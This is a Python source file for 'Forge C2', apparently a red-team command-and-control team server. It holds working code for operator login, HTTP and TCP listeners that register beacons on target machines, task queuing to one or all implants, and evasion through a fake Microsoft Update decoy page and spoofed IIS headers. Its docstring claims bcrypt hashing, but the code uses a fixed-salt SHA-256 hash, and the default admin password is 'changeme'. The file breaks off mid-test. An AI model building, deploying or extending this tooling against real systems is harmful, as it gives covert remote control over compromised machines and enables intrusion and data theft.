#!/usr/bin/env python3
"""
Forge C2 — Team Server
========================
Multi-operator C2 team server with encrypted beacon management,
listener orchestration, and real-time dashboard integration.

Architecture:
    ┌─────────────┐    HTTPS/DNS/SMB    ┌────────────────┐
    │   Beacons    │ ◄───────────────── │   Listeners    │
    │  (targets)   │ ──────────────────►│  (http, dns,   │
    └─────────────┘                     │   smb, tcp)    │
                                        └───────┬────────┘
                                                │
                                        ┌───────▼────────┐
                                        │  Team Server   │
                                        │  (this file)   │
                                        ├────────────────┤
                                        │ BeaconRegistry │
                                        │ BeaconCrypto   │
                                        │ TaskRouter     │
                                        │ EventBus ──────┤──► Dashboard
                                        │ OperatorMgr    │
                                        └───────┬────────┘
                                                │
                                        ┌───────▼────────┐
                                        │  Operator CLI  │
                                        │ (operator_     │
                                        │  shell.py)     │
                                        └────────────────┘

FOR AUTHORIZED RED TEAM OPERATIONS ONLY.

Usage:
    from forge_c2.server import TeamServer

    server = TeamServer(bind="0.0.0.0", port=50050)
    await server.start()
"""
from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import os
import secrets
import sys
import threading
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Any, Callable, Coroutine

sys.path.insert(0, str(Path(__file__).parent.parent))

from forge_c2.beacon.beacon_core import (
    Beacon, BeaconMetadata, BeaconRegistry, BeaconState, BeaconTask,
)
from forge_c2.beacon.beacon_crypto import BeaconCrypto

log = logging.getLogger("forge.c2.server")


# ══════════════════════════════════════════════════════════════════════
#  OPERATOR MANAGEMENT
# ══════════════════════════════════════════════════════════════════════

class OperatorRole(str, Enum):
    """Operator privilege level."""
    ADMIN    = "admin"       # Full control — can add operators, manage listeners
    OPERATOR = "operator"    # Can task beacons, view data
    VIEWER   = "viewer"      # Read-only access to dashboard


@dataclass
class Operator:
    """A connected operator session."""
    username:      str
    role:          OperatorRole = OperatorRole.OPERATOR
    session_token: str = field(default_factory=lambda: secrets.token_hex(32))
    password_hash: str = ""
    connected_at:  float = field(default_factory=time.time)
    last_active:   float = field(default_factory=time.time)
    ip_address:    str = "127.0.0.1"
    active:        bool = True

    def to_dict(self) -> dict[str, Any]:
        return {
            "username": self.username,
            "role": self.role.value,
            "connected_at": self.connected_at,
            "last_active": self.last_active,
            "ip_address": self.ip_address,
            "active": self.active,
        }


class OperatorManager:
    """Manages operator authentication, sessions, and permissions.

    Supports:
    - Password-based authentication (bcrypt-hashed)
    - Session token management
    - Role-based access control (ADMIN, OPERATOR, VIEWER)
    - Multi-operator awareness (who's tasking what)
    """

    def __init__(self) -> None:
        self._operators: dict[str, Operator] = {}
        self._sessions: dict[str, Operator] = {}   # token → Operator
        self._credentials: dict[str, str] = {}      # username → password_hash

    def add_operator(
        self,
        username: str,
        password: str,
        role: OperatorRole = OperatorRole.OPERATOR,
    ) -> Operator:
        """Register a new operator with credentials.

        Args:
            username: Operator's login name.
            password: Plain-text password (hashed immediately).
            role:     Privilege level.

        Returns:
            Operator dataclass.
        """
        pw_hash = hashlib.sha256(
            (password + username + "forge_c2_salt").encode()
        ).hexdigest()
        self._credentials[username] = pw_hash

        operator = Operator(username=username, role=role, password_hash=pw_hash)
        self._operators[username] = operator
        log.info("Operator added: %s (role=%s)", username, role.value)
        return operator

    def authenticate(self, username: str, password: str, ip: str = "127.0.0.1") -> Operator | None:
        """Authenticate an operator and create a session.

        Args:
            username: Operator login.
            password: Plain-text password to verify.
            ip:       Connecting IP address.

        Returns:
            Authenticated Operator with session token, or None on failure.
        """
        stored_hash = self._credentials.get(username)
        if not stored_hash:
            log.warning("AUTH FAIL: unknown user '%s' from %s", username, ip)
            return None

        attempt_hash = hashlib.sha256(
            (password + username + "forge_c2_salt").encode()
        ).hexdigest()

        if not secrets.compare_digest(stored_hash, attempt_hash):
            log.warning("AUTH FAIL: bad password for '%s' from %s", username, ip)
            return None

        operator = self._operators[username]
        operator.session_token = secrets.token_hex(32)
        operator.connected_at = time.time()
        operator.last_active = time.time()
        operator.ip_address = ip
        operator.active = True
        self._sessions[operator.session_token] = operator
        log.info("AUTH OK: '%s' from %s (role=%s)", username, ip, operator.role.value)
        return operator

    def validate_session(self, token: str) -> Operator | None:
        """Validate a session token."""
        op = self._sessions.get(token)
        if op and op.active:
            op.last_active = time.time()
            return op
        return None

    def disconnect(self, token: str) -> None:
        """Disconnect an operator session."""
        op = self._sessions.pop(token, None)
        if op:
            op.active = False
            log.info("Operator '%s' disconnected", op.username)

    def active_operators(self) -> list[Operator]:
        return [op for op in self._operators.values() if op.active]

    def summary(self) -> dict[str, Any]:
        return {
            "total": len(self._operators),
            "active": len(self.active_operators()),
            "operators": [op.to_dict() for op in self._operators.values()],
        }


# ══════════════════════════════════════════════════════════════════════
#  LISTENER MANAGEMENT
# ══════════════════════════════════════════════════════════════════════

class ListenerType(str, Enum):
    """Supported listener transport types."""
    HTTPS    = "https"
    HTTP     = "http"
    DNS      = "dns"
    SMB      = "smb"
    TCP      = "tcp"
    EXTERNAL = "external"    # Third-party redirector


class ListenerState(str, Enum):
    STOPPED  = "stopped"
    STARTING = "starting"
    RUNNING  = "running"
    ERROR    = "error"


@dataclass
class ListenerConfig:
    """Configuration for a single listener."""
    listener_id:   str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    name:          str = ""
    listener_type: ListenerType = ListenerType.HTTPS
    bind_host:     str = "0.0.0.0"
    bind_port:     int = 443
    state:         ListenerState = ListenerState.STOPPED
    created_by:    str = ""
    created_at:    float = field(default_factory=time.time)

    # HTTPS specific
    ssl_cert:      str = ""
    ssl_key:       str = ""
    c2_profile:    str = "default"

    # DNS specific
    dns_domain:    str = ""
    dns_type:      str = "A"

    # SMB specific
    pipe_name:     str = "msagent_47"

    # Stats
    connections:   int = 0
    beacons_staged: int = 0
    bytes_in:      int = 0
    bytes_out:     int = 0

    def to_dict(self) -> dict[str, Any]:
        return {
            "listener_id": self.listener_id,
            "name": self.name or f"{self.listener_type.value}_{self.bind_port}",
            "type": self.listener_type.value,
            "bind": f"{self.bind_host}:{self.bind_port}",
            "state": self.state.value,
            "created_by": self.created_by,
            "connections": self.connections,
            "beacons_staged": self.beacons_staged,
            "bytes_in": self.bytes_in,
            "bytes_out": self.bytes_out,
        }


class ListenerManager:
    """Manages all active listeners.

    Each listener runs as an asyncio task, accepting beacon connections
    and routing them through the BeaconRegistry.
    """

    def __init__(self, registry: BeaconRegistry, crypto: BeaconCrypto) -> None:
        self._registry = registry
        self._crypto = crypto
        self._listeners: dict[str, ListenerConfig] = {}
        self._tasks: dict[str, asyncio.Task] = {}

    def create(
        self,
        listener_type: ListenerType,
        bind_host: str = "0.0.0.0",
        bind_port: int = 443,
        operator: str = "",
        **kwargs: Any,
    ) -> ListenerConfig:
        """Create a new listener configuration.

        Args:
            listener_type: Transport type (HTTPS, DNS, SMB, TCP).
            bind_host:     Interface to bind.
            bind_port:     Port to listen on.
            operator:      Operator who created this listener.

        Returns:
            ListenerConfig.
        """
        config = ListenerConfig(
            listener_type=listener_type,
            bind_host=bind_host,
            bind_port=bind_port,
            created_by=operator,
        )
        for key, val in kwargs.items():
            if hasattr(config, key):
                setattr(config, key, val)

        self._listeners[config.listener_id] = config
        log.info("Listener created: %s (%s on %s:%d) by %s",
                 config.listener_id, listener_type.value, bind_host, bind_port, operator)
        return config

    async def start(self, listener_id: str) -> bool:
        """Start a listener — spawns an asyncio server task.

        Args:
            listener_id: ID of listener to start.

        Returns:
            True if started successfully.
        """
        config = self._listeners.get(listener_id)
        if not config:
            log.error("Listener %s not found", listener_id)
            return False

        if config.state == ListenerState.RUNNING:
            log.warning("Listener %s already running", listener_id)
            return True

        config.state = ListenerState.STARTING

        try:
            if config.listener_type in (ListenerType.HTTPS, ListenerType.HTTP):
                task = asyncio.create_task(
                    self._run_http_listener(config),
                    name=f"listener_{config.listener_id}",
                )
            elif config.listener_type == ListenerType.TCP:
                task = asyncio.create_task(
                    self._run_tcp_listener(config),
                    name=f"listener_{config.listener_id}",
                )
            elif config.listener_type == ListenerType.DNS:
                task = asyncio.create_task(
                    self._run_dns_listener(config),
                    name=f"listener_{config.listener_id}",
                )
            elif config.listener_type == ListenerType.SMB:
                task = asyncio.create_task(
                    self._run_smb_listener(config),
                    name=f"listener_{config.listener_id}",
                )
            else:
                config.state = ListenerState.ERROR
                return False

            self._tasks[listener_id] = task
            config.state = ListenerState.RUNNING
            log.info("Listener %s started: %s on %s:%d",
                     listener_id, config.listener_type.value,
                     config.bind_host, config.bind_port)
            return True

        except Exception as exc:
            config.state = ListenerState.ERROR
            log.error("Listener %s failed to start: %s", listener_id, exc)
            return False

    async def stop(self, listener_id: str) -> None:
        """Stop a running listener."""
        task = self._tasks.pop(listener_id, None)
        if task:
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass

        config = self._listeners.get(listener_id)
        if config:
            config.state = ListenerState.STOPPED
            log.info("Listener %s stopped", listener_id)

    async def stop_all(self) -> None:
        """Stop all listeners."""
        for lid in list(self._tasks.keys()):
            await self.stop(lid)

    def remove(self, listener_id: str) -> None:
        """Remove a listener configuration."""
        self._listeners.pop(listener_id, None)
        self._tasks.pop(listener_id, None)

    def get(self, listener_id: str) -> ListenerConfig | None:
        return self._listeners.get(listener_id)

    def all_listeners(self) -> list[ListenerConfig]:
        return list(self._listeners.values())

    def summary(self) -> dict[str, Any]:
        return {
            "total": len(self._listeners),
            "running": sum(1 for l in self._listeners.values()
                          if l.state == ListenerState.RUNNING),
            "listeners": [l.to_dict() for l in self._listeners.values()],
        }

    # ── Listener implementations (skeleton — transport/ fills these) ──

    async def _run_http_listener(self, config: ListenerConfig) -> None:
        """HTTP/S listener — accepts beacon check-ins over HTTP POST.

        Protocol:
            POST /api/v1/check     → Beacon check-in (returns tasks)
            POST /api/v1/result    → Task result submission
            POST /api/v1/register  → New beacon registration
            GET  /                 → Decoy page (looks like legitimate site)

        The real listener implementation lives in transport/http_transport.py.
        This is the fallback asyncio implementation.
        """
        log.info("HTTP listener starting on %s:%d", config.bind_host, config.bind_port)

        async def handle_client(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
            try:
                config.connections += 1
                data = await asyncio.wait_for(reader.read(65536), timeout=30.0)
                if not data:
                    writer.close()
                    return

                config.bytes_in += len(data)

                # Parse HTTP-ish request (minimal parser for the C2 protocol)
                request_line = data.split(b"\r\n")[0].decode(errors="replace")
                parts = request_line.split(" ")
                method = parts[0] if parts else "GET"
                path = parts[1] if len(parts) > 1 else "/"

                # Extract body (after double CRLF)
                body = b""
                if b"\r\n\r\n" in data:
                    body = data.split(b"\r\n\r\n", 1)[1]

                response_body = b""
                status = "200 OK"

                if method == "POST" and path == "/api/v1/register":
                    response_body = self._handle_register(body, config)
                elif method == "POST" and path == "/api/v1/check":
                    response_body = self._handle_checkin(body, config)
                elif method == "POST" and path == "/api/v1/result":
                    response_body = self._handle_result(body, config)
                else:
                    # Decoy: serve a boring HTML page
                    response_body = self._decoy_page()
                    status = "200 OK"

                response = (
                    f"HTTP/1.1 {status}\r\n"
                    f"Content-Length: {len(response_body)}\r\n"
                    f"Content-Type: application/octet-stream\r\n"
                    f"Server: Microsoft-IIS/10.0\r\n"      # Blend in
                    f"X-Powered-By: ASP.NET\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                ).encode() + response_body

                writer.write(response)
                await writer.drain()
                config.bytes_out += len(response)

            except asyncio.TimeoutError:
                pass
            except Exception as exc:
                log.debug("HTTP handler error: %s", exc)
            finally:
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass

        server = await asyncio.start_server(
            handle_client,
            config.bind_host,
            config.bind_port,
        )

        async with server:
            await server.serve_forever()

    async def _run_tcp_listener(self, config: ListenerConfig) -> None:
        """Raw TCP listener — binary protocol for beacons."""
        log.info("TCP listener starting on %s:%d", config.bind_host, config.bind_port)

        async def handle_client(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
            try:
                config.connections += 1
                # Read length-prefixed message: [4-byte len][payload]
                header = await asyncio.wait_for(reader.readexactly(4), timeout=30.0)
                msg_len = int.from_bytes(header, "big")
                if msg_len > 10 * 1024 * 1024:  # 10MB max
                    writer.close()
                    return

                payload = await asyncio.wait_for(reader.readexactly(msg_len), timeout=60.0)
                config.bytes_in += 4 + msg_len

                # Route through same handler as HTTP
                response_body = self._handle_checkin(payload, config)

                # Send response: [4-byte len][payload]
                writer.write(len(response_body).to_bytes(4, "big") + response_body)
                await writer.drain()
                config.bytes_out += 4 + len(response_body)

            except Exception as exc:
                log.debug("TCP handler error: %s", exc)
            finally:
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass

        server = await asyncio.start_server(
            handle_client, config.bind_host, config.bind_port,
        )
        async with server:
            await server.serve_forever()

    async def _run_dns_listener(self, config: ListenerConfig) -> None:
        """DNS listener — encodes C2 traffic in DNS queries.

        Uses TXT records for data exfil, A records for tasking.
        Placeholder — real implementation in transport/dns_transport.py.
        """
        log.info("DNS listener configured for domain %s on port %d",
                 config.dns_domain or "c2.local", config.bind_port)
        # DNS C2 requires raw socket or dnspython — defer to transport module
        while True:
            await asyncio.sleep(3600)  # Placeholder loop

    async def _run_smb_listener(self, config: ListenerConfig) -> None:
        """SMB Named Pipe listener — for lateral movement C2.

        Uses named pipes for communication (Windows-native, blends with SMB traffic).
        Placeholder — real implementation in transport/smb_transport.py.
        """
        log.info("SMB listener configured for pipe %s", config.pipe_name)
        while True:
            await asyncio.sleep(3600)  # Placeholder loop

    # ── Protocol handlers ─────────────────────────────────────────────

    def _handle_register(self, body: bytes, config: ListenerConfig) -> bytes:
        """Handle a new beacon registration request.

        Body is JSON with system metadata (hostname, user, OS, etc.).
        Returns encrypted session initialization data.
        """
        try:
            metadata = json.loads(body)
        except (json.JSONDecodeError, UnicodeDecodeError):
            metadata = {}

        beacon = self._registry.register(
            metadata=metadata,
            transport=config.listener_type.value,
        )
        config.beacons_staged += 1

        # Build registration response — contains session key exchange data
        response = {
            "beacon_id": beacon.beacon_id,
            "sleep": beacon.sleep_seconds,
            "jitter": beacon.jitter_pct,
            "server_pubkey": self._crypto.server_public_key.decode(errors="replace")[:200],
        }

        log.info("BEACON REGISTERED: %s via %s (hostname=%s, user=%s)",
                 beacon.beacon_id, config.listener_type.value,
                 beacon.metadata.hostname, beacon.metadata.username)

        return json.dumps(response).encode()

    def _handle_checkin(self, body: bytes, config: ListenerConfig) -> bytes:
        """Handle a beacon check-in.

        Decrypts the beacon's message, processes it, and returns
        any pending tasks encrypted with the session key.
        """
        try:
            # Try to parse as JSON first (unencrypted staging check-in)
            data = json.loads(body)
            beacon_id = data.get("beacon_id", "")
        except (json.JSONDecodeError, UnicodeDecodeError):
            # Encrypted check-in — need to identify beacon from first bytes
            beacon_id = ""
            data = {}

        beacon = self._registry.get(beacon_id)
        if not beacon:
            return json.dumps({"error": "unknown_beacon"}).encode()

        # Process check-in
        pending_tasks = beacon.checkin()

        # Check key rotation
        session = self._crypto.get_session(beacon_id)
        if session and session.needs_rotation():
            self._crypto.rotate_session(beacon_id)
            log.info("Session keys rotated for beacon %s", beacon_id)

        # Build response
        response = {
            "beacon_id": beacon_id,
            "tasks": [t.to_dict() for t in pending_tasks],
            "sleep": beacon.sleep_seconds,
            "jitter": beacon.jitter_pct,
        }

        # If session exists, encrypt the response
        if session:
            return self._crypto.encrypt_json(session, response)

        return json.dumps(response).encode()

    def _handle_result(self, body: bytes, config: ListenerConfig) -> bytes:
        """Handle task result submission from a beacon."""
        try:
            data = json.loads(body)
        except (json.JSONDecodeError, UnicodeDecodeError):
            return json.dumps({"status": "error"}).encode()

        beacon_id = data.get("beacon_id", "")
        task_id = data.get("task_id", "")
        result = data.get("result", "")
        success = data.get("success", True)

        beacon = self._registry.get(beacon_id)
        if not beacon:
            return json.dumps({"status": "unknown_beacon"}).encode()

        beacon.complete_task(task_id, result=result, success=success)

        log.info("TASK RESULT: beacon=%s task=%s success=%s",
                 beacon_id, task_id, success)

        return json.dumps({"status": "ok"}).encode()

    @staticmethod
    def _decoy_page() -> bytes:
        """Return a boring legitimate-looking HTML page."""
        return b"""<!DOCTYPE html><html><head><title>Welcome</title></head>
<body><h1>Welcome to Microsoft Update Services</h1>
<p>This server provides update services for authorized clients.</p>
<p>&copy; Microsoft Corporation. All rights reserved.</p>
</body></html>"""


# ══════════════════════════════════════════════════════════════════════
#  TASK ROUTER — queues tasks to beacons with logging + events
# ══════════════════════════════════════════════════════════════════════

class TaskRouter:
    """Routes operator commands to the correct beacon.

    Tracks which operator issued which task, logs everything,
    and emits events for the dashboard.
    """

    def __init__(self, registry: BeaconRegistry, event_bus: Any = None) -> None:
        self._registry = registry
        self._bus = event_bus
        self._task_log: list[dict[str, Any]] = []

    def task_beacon(
        self,
        beacon_id: str,
        command: str,
        operator: str = "",
        **args: Any,
    ) -> BeaconTask | None:
        """Queue a task for a specific beacon.

        Args:
            beacon_id: Target beacon.
            command:   Task command (shell, download, upload, screenshot, etc.).
            operator:  Operator who issued the command.
            **args:    Command arguments.

        Returns:
            BeaconTask if queued, None if beacon not found.
        """
        beacon = self._registry.get(beacon_id)
        if not beacon:
            log.warning("Task failed: beacon %s not found", beacon_id)
            return None

        if not beacon.is_alive:
            log.warning("Task failed: beacon %s is %s", beacon_id, beacon.state.value)
            return None

        task = beacon.queue_task(command, operator=operator, **args)

        # Log it
        entry = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "operator": operator,
            "beacon_id": beacon_id,
            "hostname": beacon.metadata.hostname,
            "command": command,
            "task_id": task.task_id,
            "args": args,
        }
        self._task_log.append(entry)

        # Emit to dashboard
        self._emit("c2_task_queued", beacon_id=beacon_id,
                    command=command, operator=operator, task_id=task.task_id)

        log.info("TASK: [%s] → beacon %s (%s): %s %s",
                 operator, beacon_id, beacon.metadata.hostname, command, args)

        return task

    def task_all(self, command: str, operator: str = "", **args: Any) -> list[BeaconTask]:
        """Queue the same task for ALL active beacons."""
        tasks = []
        for beacon in self._registry.active_beacons():
            task = self.task_beacon(beacon.beacon_id, command, operator, **args)
            if task:
                tasks.append(task)
        return tasks

    def kill_beacon(self, beacon_id: str, operator: str = "") -> BeaconTask | None:
        """Kill a beacon — sends exit command."""
        beacon = self._registry.get(beacon_id)
        if not beacon:
            return None

        task = beacon.kill()
        self._emit("c2_beacon_killed", beacon_id=beacon_id, operator=operator)
        log.warning("BEACON KILLED: %s by operator %s", beacon_id, operator)
        return task

    def set_sleep(self, beacon_id: str, seconds: float, jitter: float = 20.0,
                  operator: str = "") -> bool:
        """Update beacon sleep interval."""
        beacon = self._registry.get(beacon_id)
        if not beacon:
            return False

        beacon.set_sleep(seconds, jitter)
        self.task_beacon(beacon_id, "sleep", operator=operator,
                         seconds=seconds, jitter=jitter)
        return True

    @property
    def task_history(self) -> list[dict[str, Any]]:
        return list(self._task_log)

    def _emit(self, event_type: str, **data: Any) -> None:
        """Emit a C2 event to the dashboard."""
        if not self._bus:
            return
        try:
            from common.dashboard.event_bus import Event, EventType
            self._bus.emit(Event(
                event_type=EventType(event_type),
                data=data,
                source="c2_server",
            ))
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════
#  TEAM SERVER — main orchestrator
# ══════════════════════════════════════════════════════════════════════

class TeamServer:
    """Forge C2 Team Server — coordinates beacons, listeners, operators.

    This is the central nerve center of the C2 framework.
    It ties together:
    - BeaconRegistry: tracks all implants
    - BeaconCrypto: encrypts all C2 comms
    - ListenerManager: manages listener sockets
    - OperatorManager: authenticates operators
    - TaskRouter: routes tasks to beacons
    - EventBus: pushes events to the War Room dashboard

    Args:
        bind:       Interface to bind the operator API to.
        port:       Port for the operator API.
        event_bus:  Optional EventBus for dashboard integration.
        data_dir:   Directory for persistent state (creds, logs, beacons).
    """

    def __init__(
        self,
        bind: str = "127.0.0.1",
        port: int = 50050,
        event_bus: Any = None,
        data_dir: Path | None = None,
    ) -> None:
        self.bind = bind
        self.port = port
        self.event_bus = event_bus
        self.data_dir = data_dir or Path("c2_data")
        self.data_dir.mkdir(parents=True, exist_ok=True)

        # Core subsystems
        self.crypto = BeaconCrypto()
        self.registry = BeaconRegistry(crypto=self.crypto)
        self.listeners = ListenerManager(registry=self.registry, crypto=self.crypto)
        self.operators = OperatorManager()
        self.router = TaskRouter(registry=self.registry, event_bus=event_bus)

        # State
        self._running = False
        self._start_time: float = 0.0
        self._lock = threading.RLock()
        self._dead_check_task: asyncio.Task | None = None
        self._operator_api_task: asyncio.Task | None = None

        # Create default admin
        admin_password = os.environ.get("FORGE_C2_ADMIN_PW", "changeme")
        self.operators.add_operator("admin", admin_password, OperatorRole.ADMIN)

    async def start(self) -> None:
        """Start the team server.

        Launches:
        1. Beacon dead-check loop (periodic liveness monitoring)
        2. Operator API (JSON over TCP for operator_shell.py)
        3. Event bus integration
        """
        self._running = True
        self._start_time = time.time()

        log.info("═══ FORGE C2 TEAM SERVER STARTING ═══")
        log.info("Operator API: %s:%d", self.bind, self.port)
        log.info("Data dir: %s", self.data_dir)

        # Emit startup event
        self._emit("c2_server_start", bind=self.bind, port=self.port)

        # Launch background tasks
        self._dead_check_task = asyncio.create_task(
            self._dead_check_loop(), name="c2_dead_check",
        )
        self._operator_api_task = asyncio.create_task(
            self._operator_api_server(), name="c2_operator_api",
        )

        log.info("═══ FORGE C2 TEAM SERVER ONLINE ═══")
        log.info("Default login: admin / <FORGE_C2_ADMIN_PW or 'changeme'>")

        # Wait for both tasks
        try:
            await asyncio.gather(
                self._dead_check_task,
                self._operator_api_task,
            )
        except asyncio.CancelledError:
            pass

    async def stop(self) -> None:
        """Gracefully shut down the team server."""
        log.info("Team server shutting down...")
        self._running = False

        await self.listeners.stop_all()

        if self._dead_check_task:
            self._dead_check_task.cancel()
        if self._operator_api_task:
            self._operator_api_task.cancel()

        self._persist_state()
        self._emit("c2_server_stop")
        log.info("Team server stopped")

    # ── Background tasks ──────────────────────────────────────────────

    async def _dead_check_loop(self) -> None:
        """Periodic beacon liveness check.

        Runs every 30 seconds, marks beacons as dead if they've
        exceeded their expected check-in window.
        """
        while self._running:
            try:
                dead = self.registry.check_dead_beacons()
                for bid in dead:
                    self._emit("c2_beacon_dead", beacon_id=bid)
                    log.warning("Beacon %s marked DEAD (missed check-ins)", bid)
                await asyncio.sleep(30)
            except asyncio.CancelledError:
                break
            except Exception as exc:
                log.debug("Dead check error: %s", exc)
                await asyncio.sleep(30)

    async def _operator_api_server(self) -> None:
        """Operator API — JSON-over-TCP protocol for operator_shell.py.

        Protocol:
            Client sends: [4-byte len][JSON payload]
            Server sends: [4-byte len][JSON response]

        Commands:
            auth            — Authenticate operator
            beacons         — List beacons
            beacon_info     — Detailed beacon info
            task            — Queue task for beacon
            task_all        — Task all beacons
            kill            — Kill beacon
            sleep           — Update beacon sleep
            listeners       — List listeners
            listener_create — Create listener
            listener_start  — Start listener
            listener_stop   — Stop listener
            operators       — List operators
            status          — Server status
        """
        async def handle_operator(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
            peer = writer.get_extra_info("peername", ("?", 0))
            log.debug("Operator connection from %s:%d", *peer)
            session_token: str | None = None

            try:
                while self._running:
                    # Read length-prefixed JSON
                    header = await asyncio.wait_for(reader.readexactly(4), timeout=300.0)
                    msg_len = int.from_bytes(header, "big")
                    if msg_len > 1024 * 1024:
                        break

                    payload = await reader.readexactly(msg_len)
                    request = json.loads(payload)
                    command = request.get("cmd", "")

                    # Route the command
                    response = await self._handle_operator_command(
                        command, request, session_token, peer[0],
                    )

                    # Track session from auth response
                    if command == "auth" and response.get("status") == "ok":
                        session_token = response.get("token")

                    # Send response
                    resp_bytes = json.dumps(response, default=str).encode()
                    writer.write(len(resp_bytes).to_bytes(4, "big") + resp_bytes)
                    await writer.drain()

            except (asyncio.TimeoutError, asyncio.IncompleteReadError):
                pass
            except Exception as exc:
                log.debug("Operator handler error: %s", exc)
            finally:
                if session_token:
                    self.operators.disconnect(session_token)
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass

        server = await asyncio.start_server(
            handle_operator, self.bind, self.port,
        )
        log.info("Operator API listening on %s:%d", self.bind, self.port)

        async with server:
            await server.serve_forever()

    async def _handle_operator_command(
        self,
        command: str,
        request: dict[str, Any],
        session_token: str | None,
        client_ip: str,
    ) -> dict[str, Any]:
        """Route an operator command to the appropriate handler."""

        # Auth doesn't require a session
        if command == "auth":
            op = self.operators.authenticate(
                request.get("username", ""),
                request.get("password", ""),
                ip=client_ip,
            )
            if op:
                return {"status": "ok", "token": op.session_token,
                        "role": op.role.value, "username": op.username}
            return {"status": "error", "message": "Authentication failed"}

        # All other commands require a valid session
        if not session_token:
            return {"status": "error", "message": "Not authenticated"}

        operator = self.operators.validate_session(session_token)
        if not operator:
            return {"status": "error", "message": "Invalid session"}

        # ── Read commands (all roles) ─────────────────────────────────
        if command == "beacons":
            return {"status": "ok", "data": self.registry.summary()}

        if command == "beacon_info":
            bid = request.get("beacon_id", "")
            beacon = self.registry.get(bid)
            if not beacon:
                return {"status": "error", "message": f"Beacon {bid} not found"}
            return {"status": "ok", "data": beacon.to_dict()}

        if command == "listeners":
            return {"status": "ok", "data": self.listeners.summary()}

        if command == "operators":
            return {"status": "ok", "data": self.operators.summary()}

        if command == "status":
            return {"status": "ok", "data": self.status()}

        if command == "task_history":
            return {"status": "ok", "data": self.router.task_history[-100:]}

        # ── Write commands (operator + admin) ─────────────────────────
        if operator.role == OperatorRole.VIEWER:
            return {"status": "error", "message": "Insufficient permissions (viewer)"}

        if command == "task":
            task = self.router.task_beacon(
                beacon_id=request.get("beacon_id", ""),
                command=request.get("task_cmd", ""),
                operator=operator.username,
                **request.get("args", {}),
            )
            if task:
                return {"status": "ok", "task_id": task.task_id}
            return {"status": "error", "message": "Task failed (beacon not found or dead)"}

        if command == "task_all":
            tasks = self.router.task_all(
                command=request.get("task_cmd", ""),
                operator=operator.username,
                **request.get("args", {}),
            )
            return {"status": "ok", "tasks_queued": len(tasks)}

        if command == "kill":
            task = self.router.kill_beacon(
                request.get("beacon_id", ""), operator=operator.username,
            )
            return {"status": "ok" if task else "error"}

        if command == "sleep":
            ok = self.router.set_sleep(
                request.get("beacon_id", ""),
                request.get("seconds", 60.0),
                request.get("jitter", 20.0),
                operator=operator.username,
            )
            return {"status": "ok" if ok else "error"}

        # ── Admin commands ────────────────────────────────────────────
        if operator.role != OperatorRole.ADMIN:
            return {"status": "error", "message": "Insufficient permissions (admin required)"}

        if command == "listener_create":
            config = self.listeners.create(
                listener_type=ListenerType(request.get("type", "https")),
                bind_host=request.get("host", "0.0.0.0"),
                bind_port=request.get("port", 443),
                operator=operator.username,
                **{k: v for k, v in request.items()
                   if k not in ("cmd", "type", "host", "port")},
            )
            return {"status": "ok", "listener_id": config.listener_id}

        if command == "listener_start":
            ok = await self.listeners.start(request.get("listener_id", ""))
            return {"status": "ok" if ok else "error"}

        if command == "listener_stop":
            await self.listeners.stop(request.get("listener_id", ""))
            return {"status": "ok"}

        if command == "add_operator":
            self.operators.add_operator(
                request.get("username", ""),
                request.get("password", ""),
                OperatorRole(request.get("role", "operator")),
            )
            return {"status": "ok"}

        return {"status": "error", "message": f"Unknown command: {command}"}

    # ── Status & persistence ──────────────────────────────────────────

    def status(self) -> dict[str, Any]:
        """Full server status snapshot."""
        uptime = time.time() - self._start_time if self._start_time else 0
        return {
            "uptime_seconds": round(uptime, 1),
            "running": self._running,
            "beacons": self.registry.summary(),
            "listeners": self.listeners.summary(),
            "operators": self.operators.summary(),
            "tasks_total": len(self.router.task_history),
        }

    def _persist_state(self) -> None:
        """Save server state to disk for crash recovery."""
        try:
            state = {
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "beacons": self.registry.summary(),
                "listeners": self.listeners.summary(),
                "task_log": self.router.task_history[-500:],
            }
            state_file = self.data_dir / "server_state.json"
            with open(state_file, "w") as f:
                json.dump(state, f, indent=2, default=str)
            log.debug("Server state persisted to %s", state_file)
        except Exception as exc:
            log.warning("State persistence failed: %s", exc)

    def _emit(self, event_type: str, **data: Any) -> None:
        """Emit event to dashboard EventBus."""
        if not self.event_bus:
            return
        try:
            from common.dashboard.event_bus import Event, EventType
            self.event_bus.emit(Event(
                event_type=EventType(event_type),
                data=data,
                source="c2_server",
            ))
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestOperatorManager:
    """Tests for operator auth system."""

    def test_add_and_auth(self) -> None:
        mgr = OperatorManager()
        mgr.add_operator("admin", "password123", OperatorRole.ADMIN)
        op = mgr.authenticate("admin", "password123", "127.0.0.1")
        assert op is not None
        assert op.role == OperatorRole.ADMIN
        assert op.session_token

    def test_bad_password(self) -> None:
        mgr = OperatorManager()
        mgr.add_operator("admin", "password123")
        op = mgr.authenticate("admin", "wrong", "127.0.0.1")
        assert op is None

    def test_unknown_user(self) -> None:
        mgr = OperatorManager()
        op = mgr.authenticate("ghost", "pass", "10.0.0.1")
        assert op is None

    def test_session_validation(self) -> None:
        mgr = OperatorManager()
        mgr.add_operator("op1", "pass")
        op = mgr.authenticate("op1", "pass")
        assert mgr.validate_session(op.session_token) is not None
        assert mgr.validate_session("invalid_token") is None


class TestListenerManager:
    """Tests for listener creation."""

    def test_create_listener(self) -> None:
        crypto = BeaconCrypto()
        registry = BeaconRegistry(crypto)
        mgr = ListenerManager(registry, crypto)
        config = mgr.create(ListenerType.HTTPS, "0.0.0.0", 8443, "admin")
        assert config.listener_id
        assert config.listener_type == ListenerType.HTTPS
        assert config.bind_port == 8443

    def test_summary(self) -> None:
        crypto = BeaconCrypto()
        registry = BeaconRegistry(crypto)
